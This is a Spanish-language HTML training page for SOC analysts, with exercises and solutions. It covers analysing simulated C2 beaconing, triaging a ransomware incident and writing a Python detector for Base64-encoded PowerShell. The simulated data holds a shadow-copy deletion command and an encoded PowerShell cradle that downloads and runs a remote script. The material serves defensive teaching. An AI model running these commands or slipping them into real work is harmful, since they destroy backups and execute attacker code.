@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>🟡 Nivel 2 — Medio</title>
+  <link rel="stylesheet" href="../assets/css/style.css">
+</head>
+<body>
+  <div class="container">
+<h1>🟡 Nivel 2 — Medio</h1>
+
+<p>Ejercicios que requieren análisis más profundo. Algunos necesitan código Python.</p>
+<p>Herramientas: CyberChef, Python, Wireshark (capturas simuladas)</p>
+
+<hr>
+
+<h2>Ejercicio 2.1 — Análisis de tráfico TLS sospechoso</h2>
+
+<p>El SIEM alerta sobre tráfico inusual desde <code>WORKSTATION-04</code> (192.168.10.44). Tenés los siguientes datos del log de red:</p>
+
+<pre><code>
+Timestamp: 2024-01-15 03:42:17 UTC
+src_ip: 192.168.10.44
+dst_ip: 45.89.123.201
+dst_port: 443
+protocol: TLS 1.2
+sni: update.microsoft-cdn.net
+tls_cert_issuer: CN=update.microsoft-cdn.net
+tls_cert_subject: CN=update.microsoft-cdn.net
+tls_cert_not_before: 2024-01-14
+tls_cert_not_after: 2025-01-14
+ja3_hash: 51c64c77e60f3980cac67a39d26b2f47
+connection_interval: [303s, 301s, 299s, 302s, 300s, 301s]
+bytes_sent: [842, 839, 841, 843, 840, 842]
+</code></pre>
+
+<p><strong>Preguntas:</strong></p>
+<ol>
+<li>Listá todos los red flags que ves en estos datos</li>
+<li>¿Qué técnica(s) de evasión está usando el atacante?</li>
+<li>¿Es legítimo el dominio <code>update.microsoft-cdn.net</code>? ¿Cómo lo verificarías?</li>
+<li>¿Qué acciones tomarías en el SOC?</li>
+<li>¿A qué técnica MITRE ATT&amp;CK corresponde este patrón?</li>
+</ol>
+
+<p>&lt;details&gt;</p>
+<p>&lt;summary&gt;💡 Pistas&lt;/summary&gt;</p>
+
+<ul>
+<li>Un certificado autofirmado tiene issuer == subject</li>
+<li>El beaconing tiene un patrón de tiempo muy regular</li>
+<li>JA3 51c64c77... está asociado a una herramienta conocida</li>
+<li>Los dominios de Microsoft tienen patrones de nomenclatura conocidos</li>
+</ul>
+
+<p>&lt;/details&gt;</p>
+
+<p>&lt;details&gt;</p>
+<p>&lt;summary&gt;✅ Solución&lt;/summary&gt;</p>
+
+<p><strong>1. Red flags:</strong></p>
+<ul>
+<li>❌ <strong>Certificado autofirmado</strong>: issuer = subject = <code>CN=update.microsoft-cdn.net</code> (nadie firmó su cert)</li>
+<li>❌ <strong>JA3 51c64c77e60f3980cac67a39d26b2f47</strong>: conocido como fingerprint de <strong>Cobalt Strike</strong></li>
+<li>❌ <strong>Beaconing exacto</strong>: intervalos ~300 segundos con stddev &lt; 2s → C2 beacon configurado a 5 min</li>
+<li>❌ <strong>Bytes enviados uniformes</strong>: 840±3 bytes → posible padding para enmascarar el beacon</li>
+<li>❌ <strong>Hora</strong>: 03:42 UTC → fuera de horario laboral normal</li>
+<li>⚠️ <strong>Dominio sospechoso</strong>: <code>microsoft-cdn.net</code> ≠ dominios reales de Microsoft (usan <code>microsoft.com</code>, <code>windows.net</code>, <code>azure.com</code>)</li>
+</ul>
+
+<p><strong>2. Técnicas de evasión:</strong></p>
+<ul>
+<li><strong>Domain spoofing / Typosquatting</strong>: dominio que parece Microsoft pero no lo es</li>
+<li><strong>HTTPS para C2</strong>: ocultar tráfico C2 detrás de TLS</li>
+<li><strong>Jitter mínimo en beaconing</strong>: intentar parecer tráfico regular</li>
+</ul>
+
+<p><strong>3. Verificación del dominio:</strong></p>
+<ul>
+<li><code>nslookup update.microsoft-cdn.net</code> → ¿resuelve a IP conocida de Microsoft?</li>
+<li><code>whois microsoft-cdn.net</code> → fecha de registro (reciente = sospechoso)</li>
+<li>Los dominios legítimos de MS: <em>.microsoft.com, </em>.windows.net, <em>.azure.com, </em>.office.com</li>
+</ul>
+
+<p><strong>4. Acciones SOC:</strong></p>
+<ol>
+<li>Aislar WORKSTATION-04 de la red</li>
+<li>Bloquear IP 45.89.123.201 en firewall</li>
+<li>Hacer dump de memoria del endpoint</li>
+<li>Investigar proceso que genera las conexiones (EDR)</li>
+<li>Buscar el mismo JA3 en otros endpoints (hunting)</li>
+<li>Escalar a IR team</li>
+</ol>
+
+<p><strong>5. MITRE ATT&amp;CK:</strong></p>
+<ul>
+<li>T1071.001 — Application Layer Protocol: Web Protocols (C2 sobre HTTPS)</li>
+<li>T1568 — Dynamic Resolution (si el dominio cambia)</li>
+<li>T1102 — no aplica aquí</li>
+<li>T1090.002 — External Proxy (posible)</li>
+<li>Cobalt Strike en sí: S0154</li>
+</ul>
+
+<p>&lt;/details&gt;</p>
+
+<hr>
+
+<h2>Ejercicio 2.2 — Análisis de ransomware en progreso</h2>
+
+<p>Un analista L1 escala una alerta porque detectó comportamiento anómalo en FILE-SERVER-01. Tenés estos datos del EDR:</p>
+
+<pre><code>
+Proceso: explorer.exe → lanzó → cmd.exe → lanzó → svchost32.exe
+svchost32.exe PID: 4821
+Tiempo activo: 00:08:32
+
+Actividad en disco (últimos 5 minutos):
+  - Archivos leídos: 8,412
+  - Archivos escritos: 8,410
+  - Extensiones modificadas: .docx → .docx.LOCKED (8,410 casos)
+  - Archivos creados: &quot;HOW_TO_DECRYPT.txt&quot; (encontrado en 847 directorios)
+
+Red:
+  - Conexión HTTPS establecida: 45.123.45.67:443 (hace 2 minutos)
+  - Datos enviados: 2.4 KB
+
+Shadow Copies: eliminadas (vssadmin delete shadows /all /quiet hace 3 min)
+Hora: 02:17 (domingo a la madrugada)
+</code></pre>
+
+<p><strong>Preguntas:</strong></p>
+<ol>
+<li>¿Está en progreso el ransomware? ¿Cómo lo sabés?</li>
+<li>¿Qué criptografía está usando probablemente?</li>
+<li>Los 2.4 KB enviados al C2, ¿qué contienen probablemente?</li>
+<li>¿Qué hacés en el próximo minuto?</li>
+<li>¿Es posible recuperación sin pagar? ¿Qué factores evaluarías?</li>
+</ol>
+
+<p>&lt;details&gt;</p>
+<p>&lt;summary&gt;✅ Solución&lt;/summary&gt;</p>
+
+<p><strong>1. Sí, está en progreso:</strong></p>
+<ul>
+<li>8,410 archivos renombrados con extensión .LOCKED = cifrado activo</li>
+<li>HOW_TO_DECRYPT.txt creado en 847 directorios = ransomnote creada</li>
+<li>Shadow copies eliminadas = anti-recovery</li>
+<li>Proceso anómalo: <code>svchost32.exe</code> (el real no tiene &quot;32&quot;)</li>
+</ul>
+
+<p><strong>2. Criptografía probable:</strong></p>
+<ul>
+<li>AES-256-CBC o AES-256-CTR para cifrar archivos (velocidad + seguridad)</li>
+<li>RSA-2048 o RSA-4096 para proteger la clave AES</li>
+<li>Patrón estándar: AES file encryption + RSA key protection</li>
+</ul>
+
+<p><strong>3. Los 2.4 KB enviados al C2 contienen probablemente:</strong></p>
+<ul>
+<li>La clave AES cifrada con RSA pública del atacante</li>
+<li>Identificador único de víctima</li>
+<li>Posiblemente información del sistema (nombre, dominio, IPs)</li>
+<li>Los 2.4 KB es consistente: clave AES (32 bytes) + RSA-2048 output (256 bytes) + metadata</li>
+</ul>
+
+<p><strong>4. Próximo minuto:</strong></p>
+<ol>
+<li><strong>Aislar FILE-SERVER-01 de red INMEDIATAMENTE</strong> (cortar switch port / desconectar NIC)</li>
+</ol>
+<p>   - Evitar que el cifrado llegue a más shares montados</p>
+<p>   - Cortar comunicación con C2</p>
+<ol>
+<li><strong>NO apagar</strong> — preservar la clave AES que podría estar en RAM</li>
+<li>Hacer snapshot de VM si es virtual</li>
+<li>Contactar al IR team</li>
+<li>Verificar otros servidores con shares: ¿están siendo afectados?</li>
+</ol>
+
+<p><strong>5. Posibilidad de recuperación:</strong></p>
+<ul>
+<li>✅ Verificar: ¿hay backups offline previos al incidente?</li>
+<li>✅ Verificar: ¿es una familia con decryptor conocido? (nomoreransom.org)</li>
+<li>✅ Dump de RAM: ¿está la clave AES en memoria? (WinPmem, FTK Imager Live)</li>
+<li>✅ ¿Solo cifró parcialmente? (algunos ransomware solo cifran los primeros KB)</li>
+<li>❌ Si todo falla y no hay backups: sin clave RSA privada del atacante → sin recuperación</li>
+<li>Pago: último recurso, no garantiza recovery, financia al atacante</li>
+</ul>
+
+<p>&lt;/details&gt;</p>
+
+<hr>
+
+<h2>Ejercicio 2.3 — Código Python: Detectar payloads Base64</h2>
+
+<p>Escribí un script Python que:</p>
+<ol>
+<li>Lea un archivo de texto con múltiples líneas</li>
+<li>Detecte strings que podrían ser Base64</li>
+<li>Intente decodificarlos</li>
+<li>Reporte cuáles podrían ser payloads de PowerShell</li>
+</ol>
+
+<p><strong>Input de prueba (guardar como <code>input_malicioso.txt</code>):</strong></p>
+<pre><code>
+2024-01-15 03:41:00 - Usuario logueado: CORP\jsmith
+2024-01-15 03:42:17 - Proceso: powershell -enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA
+2024-01-15 03:42:18 - Hash de archivo: d41d8cd98f00b204e9800998ecf8427e
+2024-01-15 03:42:20 - Proceso: cmd.exe /c whoami
+2024-01-15 03:43:00 - Proceso: powershell -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACIASABhAGMAawBlAGQAIgA=
+</code></pre>
+
+<p>&lt;details&gt;</p>
+<p>&lt;summary&gt;💡 Pistas&lt;/summary&gt;</p>
+
+<pre><code>
+import re, base64
+
+patron_enc = re.compile(r&#x27;-e(?:nc|ncodedcommand)\s+([A-Za-z0-9+/=]{20,})&#x27;, re.IGNORECASE)
+
+for linea in lines:
+    match = patron_enc.search(linea)
+    if match:
+        try:
+            decoded = base64.b64decode(match.group(1)).decode(&#x27;utf-16-le&#x27;)
+            print(f&quot;DECODED: {decoded}&quot;)
+        except:
+            pass
+</code></pre>
+
+<p>&lt;/details&gt;</p>
+
+<p>&lt;details&gt;</p>
+<p>&lt;summary&gt;✅ Solución completa&lt;/summary&gt;</p>
+
+<pre><code>
+import re
+import base64
+
+def analizar_logs(contenido):
+    patron_enc = re.compile(
+        r&#x27;-e(?:nc(?:odedcommand)?)\s+([A-Za-z0-9+/=]{20,})&#x27;,
+        re.IGNORECASE
+    )
+    
+    alertas = []
+    for i, linea in enumerate(contenido.splitlines(), 1):
+        match = patron_enc.search(linea)
+        if match:
+            b64 = match.group(1)
+            try:
+                decoded = base64.b64decode(b64).decode(&#x27;utf-16-le&#x27;)
+                alertas.append({
+                    &#x27;linea&#x27;: i,
+                    &#x27;b64&#x27;: b64[:30] + &#x27;...&#x27;,
+                    &#x27;decoded&#x27;: decoded
+                })
+            except Exception as e:
+                alertas.append({&#x27;linea&#x27;: i, &#x27;error&#x27;: str(e)})
+    return alertas
+
+# Resultado esperado:
+# Línea 2: iex (New-Object Net.WebClient).DownloadString(&#x27;http://192.168.1.100/payload.ps1&#x27;)
+# Línea 5: Write-Host &quot;Hacked&quot;
+</code></pre>
+
+<p>&lt;/details&gt;</p>
+
+<hr>
+
+<p><em>Continuá con: <a href="./nivel_3_dificil.md">nivel_3_dificil.md</a></em></p>
+
+    <br><br>
+    <a href="../index.html">&#8592; Volver al inicio</a>
+  </div>
+</body>
+</html>
